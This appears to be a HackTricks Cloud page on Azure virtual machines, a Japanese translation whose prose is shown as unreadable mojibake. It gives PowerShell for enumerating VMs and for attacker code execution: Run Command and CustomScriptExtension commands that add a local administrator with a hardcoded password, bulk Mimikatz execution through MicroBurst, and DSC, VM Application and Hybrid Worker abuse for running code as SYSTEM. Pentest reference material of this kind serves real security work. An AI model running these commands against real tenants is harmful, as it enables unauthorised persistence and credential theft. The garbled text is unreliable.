# Az - ä»®æƒ³ãƒã‚·ãƒ³

<details>

<summary><strong>ãƒãƒƒã‚¯ãƒˆãƒªãƒƒã‚¯ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ç‰¹å…¸ã‚’å¾—ã‚‹ï¼</strong></summary>

* **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼ã—ãŸã„**å ´åˆã‚„ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’å…¥æ‰‹ã—ãŸã„**å ´åˆã€ã¾ãŸã¯HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ã”ç¢ºèªãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ã”è¦§ãã ã•ã„
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ãŠã‚ˆã³** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## åŸºæœ¬æƒ…å ±

Azureã®ä»®æƒ³ãƒã‚·ãƒ³ã¯ã€AzureãŒæä¾›ã™ã‚‹[ã‚ªãƒ³ãƒ‡ãƒãƒ³ãƒ‰ã§ã‚¹ã‚±ãƒ¼ãƒ©ãƒ–ãƒ«ãªã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ãƒªã‚½ãƒ¼ã‚¹](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree)ã®ä¸€ç¨®ã§ã™ã€‚é€šå¸¸ã€ä»–ã®é¸æŠè‚¢ã‚ˆã‚Šã‚‚ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ç’°å¢ƒã‚’ã‚ˆã‚Šç´°ã‹ãåˆ¶å¾¡ã™ã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆã«ä»®æƒ³ãƒã‚·ãƒ³ã‚’é¸æŠã—ã¾ã™ã€‚ã“ã®è¨˜äº‹ã§ã¯ã€ä»®æƒ³ãƒã‚·ãƒ³ã‚’ä½œæˆã™ã‚‹å‰ã«è€ƒæ…®ã™ã¹ãäº‹é …ã€ä½œæˆæ–¹æ³•ã€ãŠã‚ˆã³ç®¡ç†æ–¹æ³•ã«ã¤ã„ã¦èª¬æ˜ã—ã¾ã™ã€‚

## åˆ—æŒ™
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **VMã§ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹**

### **VMã§ã®AADãƒ­ã‚°ã‚¤ãƒ³**

AzureADã§èªè¨¼ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€**Linux VM**ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã‚ˆã†ã¨ã™ã‚‹å ´åˆã€`ssh username@azure-corp.com@1.1.1.1`ï¼ˆãƒ­ã‚°ã‚¤ãƒ³ã—ã‚ˆã†ã¨ã™ã‚‹ã¨ãã«ä½¿ç”¨ã—ãŸazurecorpã®ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ï¼‰ã¨å…¥åŠ›ã™ã‚‹ã¨ã€æ¬¡ã®ã‚ˆã†ãªã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã™ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ï¼š

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

ä»¥ä¸‹ã®æ‰‹é †ã«å¾“ã£ã¦ãã ã•ã„ã€‚[https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€ã‚³ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã—ã€ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’è³‡æ ¼æƒ…å ±ã¨ã—ã¦ä½¿ç”¨ã—ã¦SSHæ¥ç¶šã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ï¼ˆãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒååˆ†ãªæ¨©é™ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€`Virtual Machine Administrator Login`ã¾ãŸã¯`Virtual Machine User Login`ã®å½¹å‰²ï¼‰ã€‚

### **Run Command**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **ã‚«ã‚¹ã‚¿ãƒ ã‚¹ã‚¯ãƒªãƒ—ãƒˆæ‹¡å¼µã®å®Ÿè¡Œ**

Azureä»®æƒ³ãƒã‚·ãƒ³ï¼ˆVMï¼‰æ‹¡å¼µæ©Ÿèƒ½ã¯ã€**å°ã•ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³**ã§ã‚ã‚Šã€**Azure VM**ä¸Šã§ã®ãƒ‡ãƒ—ãƒ­ã‚¤å¾Œã®è¨­å®šã¨è‡ªå‹•åŒ–**ã‚¿ã‚¹ã‚¯**ã‚’æä¾›ã—ã¾ã™ã€‚ãŸã¨ãˆã°ã€ä»®æƒ³ãƒã‚·ãƒ³ã«ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã€ã‚¦ã‚¤ãƒ«ã‚¹å¯¾ç­–ã€ã¾ãŸã¯ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡ŒãŒå¿…è¦ãªå ´åˆã€VMæ‹¡å¼µæ©Ÿèƒ½ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€æ›¸ãè¾¼ã¿ã‚¢ã‚¯ã‚»ã‚¹æ¨©é™ãŒã‚ã‚‹å ´åˆã€ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState

**DesiredConfigurationState (DSC)**ã¯Ansibleã«ä¼¼ãŸãƒ„ãƒ¼ãƒ«ã§ã‚ã‚Šã€PowerShellå†…ã®ãƒ›ã‚¹ãƒˆã‚’ã‚³ãƒ¼ãƒ‰ã§è¨­å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚DSCã¯Azureå†…ã§ã®æ‹¡å¼µæ©Ÿèƒ½ã‚’æŒã¡ã€**æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«**ã®ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚DSCã®[æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«](https://docs.microsoft.com/en-us/powershell/dsc/getting-started/wingettingstarted?view=dsc-1.1#define-a-configuration-and-generate-the-configuration-document)ã¯æ§‹æ–‡ã«é–¢ã—ã¦å³æ ¼ã§ã™ãŒã€DSCæ‹¡å¼µæ©Ÿèƒ½ã¯éå¸¸ã«ç”˜ãã€ç‰¹å®šã®å½¢å¼ã«å¾“ã£ã¦ã„ã‚Œã°**ã©ã‚“ãªã‚³ãƒãƒ³ãƒ‰ã§ã‚‚ç›²ç›®çš„ã«å®Ÿè¡Œ**ã—ã¾ã™ï¼ˆå›³5å‚ç…§ï¼‰ã€‚

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

ã“ã‚Œã¯**Az PowerShell**ã®é–¢æ•°[**`Publish-AzvmdscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0)ã‚’ä½¿ç”¨ã—ã¦è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚DSCæ‹¡å¼µæ©Ÿèƒ½ã¯ã€**.PS1**ãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¦æ±‚ã—ã€ãã‚Œã‚’**.zip**ãƒ•ã‚¡ã‚¤ãƒ«ã«ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸åŒ–ã—ã¾ã™ã€‚å®Ÿéš›ã«ã¯ã“ã‚Œã¯æ­£ã—ã„DSCæ§‹æ–‡ã§ã¯ã‚ã‚Šã¾ã›ã‚“ãŒã€æ‹¡å¼µæ©Ÿèƒ½ã®ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã¯ã€Œå¤±æ•—ã€ã¨è¡¨ç¤ºã•ã‚Œã¾ã™ãŒã€ã‚³ãƒ¼ãƒ‰ã¯å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚å•é¡Œã¯ã€ã“ã®ã‚³ãƒãƒ³ãƒ‰ã®å‡ºåŠ›ãŒãªã„ã“ã¨ã§ã™ã€‚ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã¯å¤±æ•—ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã§ä¸Šæ›¸ãã•ã‚Œã‚‹ãŸã‚ã§ã™ã€‚

### VM Application Definitions

[VM Applications](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications)ãƒªã‚½ãƒ¼ã‚¹ã¯ã€Azure VMã«**ãƒãƒ¼ã‚¸ãƒ§ãƒ³ç®¡ç†ã•ã‚ŒãŸã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ç¹°ã‚Šè¿”ã—ãƒ‡ãƒ—ãƒ­ã‚¤**ã™ã‚‹æ–¹æ³•ã§ã™ã€‚ãŸã¨ãˆã°ã€ãƒãƒ¼ã‚¸ãƒ§ãƒ³1.0ã®**ãƒ—ãƒ­ã‚°ãƒ©ãƒ **ã‚’ä½œæˆã—ã€ã™ã¹ã¦ã®Azure VMã«ãƒ‡ãƒ—ãƒ­ã‚¤ã—ãŸå ´åˆã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’1.1ã«**æ›´æ–°**ã™ã‚‹ã¨ã€åŒã˜VM Applicationã‚’ä½¿ç”¨ã—ã¦åˆ¥ã®å®šç¾©ã‚’ä½œæˆã—ã€ã‚¢ãƒƒãƒ—ãƒ‡ãƒ¼ãƒˆã‚’ä»»æ„ã®VMã«ãƒ—ãƒƒã‚·ãƒ¥ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
VMã«ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ãƒ—ãƒƒã‚·ãƒ¥ã§ãã‚‹ã¨ã„ã†ã“ã¨ã¯ã€åˆ¥ã®ã‚³ãƒ¼ãƒ‰å®Ÿè¡ŒçµŒè·¯ãŒå­˜åœ¨ã™ã‚‹ã¨ã„ã†ã“ã¨ã§ã™ã€‚ã“ã®æ–¹æ³•ã®æ¬ ç‚¹ã¯ã€Application Definitionã®è¨­å®šã«ã¯[**ã„ãã¤ã‹ã®æ‰‹é †**](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=portal)ãŒå¿…è¦ã§ã™ãŒã€Az PowerShellã®**`New-AzGalleryApplication`**ãŠã‚ˆã³**`New-AzGalleryApplicationVersion`**ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦å®Ÿè¡Œã§ãã¾ã™ã€‚

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’VMã«é©ç”¨ã™ã‚‹ã¨è‡ªå‹•çš„ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã‚‹**æ‹¡å¼µæ©Ÿèƒ½ã€ŒVMAppExtensionã€**ã‚’åˆ©ç”¨ã—ã¾ã™ã€‚ã“ã®æ‹¡å¼µæ©Ÿèƒ½ã¯ã€URIã‹ã‚‰ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ‡ã‚£ã‚¹ã‚¯ã«ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®åå‰ã¨ã¾ã£ãŸãåŒã˜åå‰ã§ä¿å­˜ã—ã¾ã™ã€‚ã¤ã¾ã‚Šã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®åå‰ãŒã€ŒAzApplicationã€ã§ã‚ã‚Œã°ã€ãƒ‡ã‚£ã‚¹ã‚¯ä¸Šã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚‚ã€ŒAzApplicationã€ã¨ã„ã†åå‰ã§ä¿å­˜ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã«ã¯ã€REST APIå‘¼ã³å‡ºã—ã®ã€ŒManageActionsã€ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’è¨­å®šã—ã¦ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’é©åˆ‡ãªæ‹¡å¼µå­ã§ãƒªãƒãƒ¼ãƒ ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å…¨ä½“ã‚’å®Ÿè¡Œã—ãŸããªã„å ´åˆã¯ã€åŒã˜REST APIãƒ¡ã‚½ãƒƒãƒ‰ã¾ãŸã¯Azure Portalã‚’ä»‹ã—ã¦ManageActionsãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’æ‚ªç”¨ã—ã¦ä»»æ„ã®PowerShellã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚è¨­å®šãŒå®Œäº†ã™ã‚‹ã¨ã€å®šç¾©ã¯å›³8ã¨ä¼¼ãŸã‚ˆã†ãªã‚‚ã®ã«ãªã‚Šã¾ã™ã€‚

<figure><img src="../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

ã“ã®å®Ÿè¡Œãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯æ®‹å¿µãªãŒã‚‰é…ã„ã§ã™ï¼ˆã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¾ãŸã¯ã‚³ãƒãƒ³ãƒ‰ã®å®Ÿè¡Œã«ç´„3ã€œ4åˆ†ã‹ã‹ã‚Šã¾ã™ï¼‰ã€‚ãŸã ã—ã€æ¯”è¼ƒçš„æ–°ã—ã„ãŸã‚ã€ç‰¹å®šã®æ¤œå‡ºæ–¹æ³•ãŒæ›¸ã‹ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã¯é©šãã§ã™ã€‚

å®Ÿè¡Œã¯æ‹¡å¼µæ©Ÿèƒ½ã«ã‚ˆã£ã¦è¡Œã‚ã‚Œã‚‹ãŸã‚ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚³ãƒ”ãƒ¼ã¯`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\`ã«ã‚ã‚Šã€å®Ÿè¡Œã®ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã¯`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\`ã«ä¿æŒã•ã‚Œã¾ã™ã€‚

### Hybrid Worker Groups

[**Hybrid Worker Groups**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker)ï¼ˆHWGï¼‰ã¯ã€Automation Accountå†…ã®æ§‹æˆã•ã‚ŒãŸ**Runbook**ã‚’ã€æ§‹æˆã•ã‚ŒãŸHWGã®ä¸€éƒ¨ã§ã‚ã‚‹**Azure Virtual machine**ã§å®Ÿè¡Œã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚å†ã³ã€VMã«ã¯æ‹¡å¼µæ©Ÿèƒ½ãŒä½¿ç”¨ã•ã‚Œã€Runbookã‚³ãƒ¼ãƒ‰ãŒVMã«ãƒ‡ãƒ—ãƒ­ã‚¤ã•ã‚Œã¾ã™ã€‚æ‹¡å¼µæ©Ÿèƒ½ãŒä½¿ç”¨ã•ã‚Œã‚‹ãŸã‚ã€è³‡æ ¼æƒ…å ±ã¯ç„¡é–¢ä¿‚ã§ã‚ã‚Šã€ã‚³ãƒ¼ãƒ‰ã¯**SYSTEM**ã¾ãŸã¯rootã¨ã—ã¦å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚

<figure><img src="../../.gitbook/assets/image (2) (5).png" alt=""><figcaption></figcaption></figure>

Windows 10 VMã‚’ä½¿ç”¨ã™ã‚‹å ´åˆã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡Œã«ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯VMã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ãªã„PowerShellãƒãƒ¼ã‚¸ãƒ§ãƒ³7.1ã§ã¯ãªãã€PowerShellãƒãƒ¼ã‚¸ãƒ§ãƒ³5.1ã§Runbookã‚’å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* **HackTricksã®åºƒå‘Šã‚’æ²è¼‰**ã—ãŸã„å ´åˆã‚„ã€**æœ€æ–°ç‰ˆã®PEASSã‚’å…¥æ‰‹**ã—ãŸã„å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ã”ç¢ºèªãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¾ã—ã‚‡ã†ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **HackTricks**ã¨**HackTricks Cloud**ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã—ã¾ã—ã‚‡ã†ã€‚

</details>
